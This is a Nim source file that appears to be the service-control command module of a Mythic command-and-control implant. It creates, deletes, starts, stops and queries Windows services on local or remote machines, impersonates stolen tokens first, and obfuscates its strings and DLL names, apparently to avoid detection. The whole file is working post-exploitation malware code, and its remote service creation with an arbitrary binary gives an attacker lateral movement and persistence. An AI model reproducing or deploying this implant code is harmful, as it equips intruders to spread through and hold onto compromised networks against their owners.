import ../utils/m_responses
import ../utils/debug
import ../utils/strenc
import std/[json, strformat, strutils]

when defined(windows):
  import winim/lean
  import token_manager
  
  const
    SC_MANAGER_ALL_ACCESS_SC = 0xF003F
    SC_MANAGER_CONNECT_SC = 0x0001
    SC_MANAGER_ENUMERATE_SERVICE_SC = 0x0004
    SERVICE_ALL_ACCESS_SC = 0xF01FF
    SERVICE_QUERY_CONFIG_SC = 0x0001
    SERVICE_QUERY_STATUS_SC = 0x0004
    SERVICE_START_SC = 0x0010
    SERVICE_STOP_SC = 0x0020
    SERVICE_NO_CHANGE_SC = 0xFFFFFFFF'i32
    SERVICE_DEMAND_START_SC = 3
    SERVICE_AUTO_START_SC = 2
    SERVICE_DISABLED_SC = 4
    SERVICE_ERROR_NORMAL_SC = 1
    SERVICE_ERROR_IGNORE_SC = 0
    SERVICE_WIN32_OWN_PROCESS_SC = 0x10
    SERVICE_CONTROL_STOP_SC = 0x00000001'i32
    SC_STATUS_PROCESS_INFO_SC = 0

    SERVICE_STOPPED_SC = 0x00000001'i32
    SERVICE_START_PENDING_SC = 0x00000002'i32
    SERVICE_STOP_PENDING_SC = 0x00000003'i32
    SERVICE_RUNNING_SC = 0x00000004'i32
    SERVICE_CONTINUE_PENDING_SC = 0x00000005'i32
    SERVICE_PAUSE_PENDING_SC = 0x00000006'i32
    SERVICE_PAUSED_SC = 0x00000007'i32
    DELETE_SC = 0x00010000
  
  type
    SC_QUERY_SERVICE_CONFIG = object
      dwServiceType: DWORD
      dwStartType: DWORD
      dwErrorControl: DWORD
      lpBinaryPathName: LPWSTR
      lpLoadOrderGroup: LPWSTR
      dwTagId: DWORD
      lpDependencies: LPWSTR
      lpServiceStartName: LPWSTR
      lpDisplayName: LPWSTR
    
    SERVICE_STATUS_SC = object
      dwServiceType: DWORD
      dwCurrentState: DWORD
      dwControlsAccepted: DWORD
      dwWin32ExitCode: DWORD
      dwServiceSpecificExitCode: DWORD
      dwCheckPoint: DWORD
      dwWaitHint: DWORD

    SERVICE_STATUS_PROCESS_SC = object
      dwServiceType: DWORD
      dwCurrentState: DWORD
      dwControlsAccepted: DWORD
      dwWin32ExitCode: DWORD
      dwServiceSpecificExitCode: DWORD
      dwCheckPoint: DWORD
      dwWaitHint: DWORD
      dwProcessId: DWORD
      dwServiceFlags: DWORD
  
  proc OpenSCManagerWSc(lpMachineName: LPCWSTR, lpDatabaseName: LPCWSTR, dwDesiredAccess: DWORD): SC_HANDLE
    {.importc: "OpenSCManagerW", dynlib: obf("advapi32.dll"), stdcall.}
  
  proc OpenServiceWSc(hSCManager: SC_HANDLE, lpServiceName: LPCWSTR, dwDesiredAccess: DWORD): SC_HANDLE
    {.importc: "OpenServiceW", dynlib: obf("advapi32.dll"), stdcall.}
  
  proc CloseServiceHandleSc(hSCObject: SC_HANDLE): WINBOOL
    {.importc: "CloseServiceHandle", dynlib: obf("advapi32.dll"), stdcall.}
  
  proc QueryServiceConfigWSc(hService: SC_HANDLE, lpServiceConfig: pointer, cbBufSize: DWORD, pcbBytesNeeded: ptr DWORD): WINBOOL
    {.importc: "QueryServiceConfigW", dynlib: obf("advapi32.dll"), stdcall.}
  
  proc QueryServiceStatusExSc(hService: SC_HANDLE, InfoLevel: DWORD, lpBuffer: ptr BYTE, cbBufSize: DWORD, pcbBytesNeeded: ptr DWORD): WINBOOL
    {.importc: "QueryServiceStatusEx", dynlib: obf("advapi32.dll"), stdcall.}
  
  proc StartServiceWSc(hService: SC_HANDLE, dwNumServiceArgs: DWORD, lpServiceArgVectors: ptr LPCWSTR): WINBOOL
    {.importc: "StartServiceW", dynlib: obf("advapi32.dll"), stdcall.}
    
  proc ControlServiceSc(hService: SC_HANDLE, dwControl: DWORD, lpServiceStatus: pointer): WINBOOL
    {.importc: "ControlService", dynlib: obf("advapi32.dll"), stdcall.}
  
  proc CreateServiceWSc(hSCManager: SC_HANDLE, lpServiceName: LPCWSTR, lpDisplayName: LPCWSTR,
                        dwDesiredAccess: DWORD, dwServiceType: DWORD, dwStartType: DWORD,
                        dwErrorControl: DWORD, lpBinaryPathName: LPCWSTR, lpLoadOrderGroup: LPCWSTR,
                        lpdwTagId: ptr DWORD, lpDependencies: LPCWSTR, lpServiceStartName: LPCWSTR,
                        lpPassword: LPCWSTR): SC_HANDLE
    {.importc: "CreateServiceW", dynlib: obf("advapi32.dll"), stdcall.}
  
  proc DeleteServiceSc(hService: SC_HANDLE): WINBOOL
    {.importc: "DeleteService", dynlib: obf("advapi32.dll"), stdcall.}
  
  proc statusToStr(state: DWORD): string =
    case state
    of SERVICE_STOPPED_SC: obf("Stopped")
    of SERVICE_START_PENDING_SC: obf("Start Pending")
    of SERVICE_STOP_PENDING_SC: obf("Stop Pending")
    of SERVICE_RUNNING_SC: obf("Running")
    of SERVICE_CONTINUE_PENDING_SC: obf("Continue Pending")
    of SERVICE_PAUSE_PENDING_SC: obf("Pause Pending")
    of SERVICE_PAUSED_SC: obf("Paused")
    else: obf("Unknown")
  
  proc startTypeToStr(st: DWORD): string =
    case st
    of 0: obf("Boot")
    of 1: obf("System")
    of 2: obf("Automatic")
    of 3: obf("Manual")
    of 4: obf("Disabled")
    else: obf("Unknown")
  
  proc serviceTypeToStr(st: DWORD): string =
    var parts: seq[string] = @[]
    if (st and 0x01) != 0: parts.add(obf("Kernel Driver"))
    if (st and 0x02) != 0: parts.add(obf("File System Driver"))
    if (st and 0x10) != 0: parts.add(obf("Win32 Own Process"))
    if (st and 0x20) != 0: parts.add(obf("Win32 Share Process"))
    if (st and 0x100) != 0: parts.add(obf("Interactive"))
    if parts.len == 0:
      return obf("Unknown (0x") & toHex(st.int, 4) & ")"
    return parts.join(obf(" | "))
  
  proc parseStartType(s: string): DWORD =
    case s.toLower()
    of obf("auto"), obf("automatic"): return DWORD(SERVICE_AUTO_START_SC)
    of obf("manual"), obf("demand"): return DWORD(SERVICE_DEMAND_START_SC)
    of obf("disabled"): return DWORD(SERVICE_DISABLED_SC)
    else: return DWORD(SERVICE_DEMAND_START_SC)
  
  proc impersonateIfToken() =
    let tokenHandle = getTokenHandle()
    if tokenHandle != 0:
      discard ImpersonateLoggedOnUser(HANDLE(tokenHandle))
  
  proc scQuery(service: string, computer: string): string =
    impersonateIfToken()
    var computerWide: WideCString
    if computer.len > 0: computerWide = newWideCString(computer)
    let scm = OpenSCManagerWSc(
      if computer.len == 0: nil else: cast[LPCWSTR](addr computerWide[0]),
      nil,
      SC_MANAGER_CONNECT_SC or SC_MANAGER_ENUMERATE_SERVICE_SC
    )
    if scm == 0:
      return obf("OpenSCManagerW failed: ") & $GetLastError()
    
    var serviceWide = newWideCString(service)
    let svc = OpenServiceWSc(scm, cast[LPCWSTR](addr serviceWide[0]),
                             SERVICE_QUERY_CONFIG_SC or SERVICE_QUERY_STATUS_SC)
    if svc == 0:
      let err = GetLastError()
      discard CloseServiceHandleSc(scm)
      return obf("OpenServiceW failed: ") & $err
    
    var output = ""
    
    # Query config
    var needed: DWORD = 0
    discard QueryServiceConfigWSc(svc, nil, 0, addr needed)
    if needed > 0:
      var buffer = newSeq[byte](needed)
      let qscPtr = cast[ptr SC_QUERY_SERVICE_CONFIG](addr buffer[0])
      if QueryServiceConfigWSc(svc, qscPtr, needed, addr needed) != 0:
        output.add(obf("Service: ") & service & "\n")
        if qscPtr.lpDisplayName != nil:
          output.add(obf("Display Name: ") & $qscPtr.lpDisplayName & "\n")
        output.add(obf("Type: ") & serviceTypeToStr(qscPtr.dwServiceType) & "\n")
        output.add(obf("Start Type: ") & startTypeToStr(qscPtr.dwStartType) & "\n")
        if qscPtr.lpBinaryPathName != nil:
          output.add(obf("Binary Path: ") & $qscPtr.lpBinaryPathName & "\n")
        if qscPtr.lpServiceStartName != nil:
          output.add(obf("Service Start Name: ") & $qscPtr.lpServiceStartName & "\n")
        if qscPtr.lpLoadOrderGroup != nil:
          output.add(obf("Load Order Group: ") & $qscPtr.lpLoadOrderGroup & "\n")
    
    # Query status
    var statusBuf = newSeq[byte](sizeof(SERVICE_STATUS_PROCESS_SC))
    var bytesNeeded: DWORD = 0
    if QueryServiceStatusExSc(svc, SC_STATUS_PROCESS_INFO_SC,
                              cast[ptr BYTE](addr statusBuf[0]),
                              DWORD(statusBuf.len), addr bytesNeeded) != 0:
      let statusInfo = cast[ptr SERVICE_STATUS_PROCESS_SC](addr statusBuf[0])
      output.add(obf("State: ") & statusToStr(statusInfo.dwCurrentState) & "\n")
      output.add(obf("PID: ") & $statusInfo.dwProcessId & "\n")
    
    discard CloseServiceHandleSc(svc)
    discard CloseServiceHandleSc(scm)
    return output
  
  proc scStart(service: string, computer: string): string =
    impersonateIfToken()
    var computerWide: WideCString
    if computer.len > 0: computerWide = newWideCString(computer)
    let scm = OpenSCManagerWSc(
      if computer.len == 0: nil else: cast[LPCWSTR](addr computerWide[0]),
      nil, SC_MANAGER_CONNECT_SC)
    if scm == 0:
      return obf("OpenSCManagerW failed: ") & $GetLastError()
    
    var serviceWide = newWideCString(service)
    let svc = OpenServiceWSc(scm, cast[LPCWSTR](addr serviceWide[0]), SERVICE_START_SC)
    if svc == 0:
      let err = GetLastError()
      discard CloseServiceHandleSc(scm)
      return obf("OpenServiceW failed: ") & $err
    
    if StartServiceWSc(svc, 0, nil) == 0:
      let err = GetLastError()
      discard CloseServiceHandleSc(svc)
      discard CloseServiceHandleSc(scm)
      return obf("StartServiceW failed: ") & $err
    
    discard CloseServiceHandleSc(svc)
    discard CloseServiceHandleSc(scm)
    return obf("Service '") & service & obf("' started successfully")
  
  proc scStop(service: string, computer: string): string =
    impersonateIfToken()
    var computerWide: WideCString
    if computer.len > 0: computerWide = newWideCString(computer)
    let scm = OpenSCManagerWSc(
      if computer.len == 0: nil else: cast[LPCWSTR](addr computerWide[0]),
      nil, SC_MANAGER_CONNECT_SC)
    if scm == 0:
      return obf("OpenSCManagerW failed: ") & $GetLastError()
    
    var serviceWide = newWideCString(service)
    let svc = OpenServiceWSc(scm, cast[LPCWSTR](addr serviceWide[0]), SERVICE_STOP_SC)
    if svc == 0:
      let err = GetLastError()
      discard CloseServiceHandleSc(scm)
      return obf("OpenServiceW failed: ") & $err
    
    var status: SERVICE_STATUS_SC
    if ControlServiceSc(svc, SERVICE_CONTROL_STOP_SC, addr status) == 0:
      let err = GetLastError()
      discard CloseServiceHandleSc(svc)
      discard CloseServiceHandleSc(scm)
      return obf("ControlService (stop) failed: ") & $err
    
    discard CloseServiceHandleSc(svc)
    discard CloseServiceHandleSc(scm)
    return obf("Service '") & service & obf("' stop signal sent")
  
  proc scCreate(service: string, computer: string, binaryPath: string,
                displayName: string, startType: string): string =
    impersonateIfToken()
    var computerWide: WideCString
    if computer.len > 0: computerWide = newWideCString(computer)
    let scm = OpenSCManagerWSc(
      if computer.len == 0: nil else: cast[LPCWSTR](addr computerWide[0]),
      nil, SC_MANAGER_ALL_ACCESS_SC)
    if scm == 0:
      return obf("OpenSCManagerW failed: ") & $GetLastError()
    
    let dn = if displayName.len > 0: displayName else: service
    let st = parseStartType(startType)
    
    var serviceWide = newWideCString(service)
    var dnWide = newWideCString(dn)
    var bpWide = newWideCString(binaryPath)
    
    let svc = CreateServiceWSc(scm,
      cast[LPCWSTR](addr serviceWide[0]),
      cast[LPCWSTR](addr dnWide[0]),
      SERVICE_ALL_ACCESS_SC,
      SERVICE_WIN32_OWN_PROCESS_SC,
      st,
      DWORD(SERVICE_ERROR_NORMAL_SC),
      cast[LPCWSTR](addr bpWide[0]),
      nil, nil, nil, nil, nil)
    
    if svc == 0:
      let err = GetLastError()
      discard CloseServiceHandleSc(scm)
      return obf("CreateServiceW failed: ") & $err
    
    discard CloseServiceHandleSc(svc)
    discard CloseServiceHandleSc(scm)
    return obf("Service '") & service & obf("' created successfully\nBinary: ") & binaryPath &
           obf("\nStart Type: ") & startTypeToStr(st)
  
  proc scDelete(service: string, computer: string): string =
    impersonateIfToken()
    var computerWide: WideCString
    if computer.len > 0: computerWide = newWideCString(computer)
    let scm = OpenSCManagerWSc(
      if computer.len == 0: nil else: cast[LPCWSTR](addr computerWide[0]),
      nil, SC_MANAGER_CONNECT_SC)
    if scm == 0:
      return obf("OpenSCManagerW failed: ") & $GetLastError()
    
    var serviceWide = newWideCString(service)
    let svc = OpenServiceWSc(scm, cast[LPCWSTR](addr serviceWide[0]), DELETE_SC)
    if svc == 0:
      let err = GetLastError()
      discard CloseServiceHandleSc(scm)
      return obf("OpenServiceW failed: ") & $err
    
    if DeleteServiceSc(svc) == 0:
      let err = GetLastError()
      discard CloseServiceHandleSc(svc)
      discard CloseServiceHandleSc(scm)
      return obf("DeleteService failed: ") & $err
    
    discard CloseServiceHandleSc(svc)
    discard CloseServiceHandleSc(scm)
    return obf("Service '") & service & obf("' marked for deletion")

proc sc*(taskId: string, params: JsonNode): JsonNode =
  when defined(windows):
    try:
      let action = params[obf("action")].getStr().toLower()
      let service = params[obf("service")].getStr()
      let computer = params.getOrDefault(obf("computer")).getStr("")
      
      debug &"[DEBUG] sc: action={action}, service={service}, computer={computer}"
      
      var output: string
      case action
      of obf("query"):
        output = scQuery(service, computer)
      of obf("start"):
        output = scStart(service, computer)
      of obf("stop"):
        output = scStop(service, computer)
      of obf("create"):
        let binaryPath = params[obf("binary_path")].getStr()
        let displayName = params.getOrDefault(obf("display_name")).getStr("")
        let startType = params.getOrDefault(obf("start_type")).getStr(obf("manual"))
        output = scCreate(service, computer, binaryPath, displayName, startType)
      of obf("delete"):
        output = scDelete(service, computer)
      else:
        return mythicError(taskId, obf("Unknown sc action: ") & action & obf(". Use query/start/stop/create/delete"))
      
      # Check if output contains "failed" to determine success/error
      if obf("failed") in output.toLower():
        return mythicError(taskId, output)
      else:
        return mythicSuccess(taskId, output)
      
    except Exception as e:
      return mythicError(taskId, obf("sc error: ") & e.msg)
  else:
    return mythicError(taskId, obf("sc command is only available on Windows"))
